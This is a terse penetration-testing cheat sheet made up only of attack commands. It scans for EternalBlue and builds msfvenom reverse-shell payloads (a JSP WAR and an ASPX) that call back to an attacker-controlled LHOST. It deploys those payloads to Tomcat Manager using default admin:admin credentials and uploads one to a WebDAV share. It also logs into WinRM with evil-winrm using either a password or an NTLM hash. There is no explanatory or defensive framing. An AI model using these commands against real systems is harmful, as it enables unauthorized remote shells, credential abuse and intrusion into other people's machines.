```
# EternalBlue MS17-010:
nmap --script smb-vuln-ms17-010 -p 445 <TARGET_IP>

# Tomcat Manager WAR deploy:
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f war -o shell.war
curl -u admin:admin -T shell.war "http://<IP>:8080/manager/text/deploy?path=/shell"
curl http://<IP>:8080/shell/

# WebDAV:
davtest -url http://<TARGET_IP>
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f aspx -o shell.aspx
curl -T shell.aspx http://<TARGET_IP>/uploads/shell.aspx

# WinRM:
evil-winrm -i <TARGET_IP> -u Administrator -p 'Password123'
evil-winrm -i <TARGET_IP> -u Administrator -H <NTLM_HASH>
```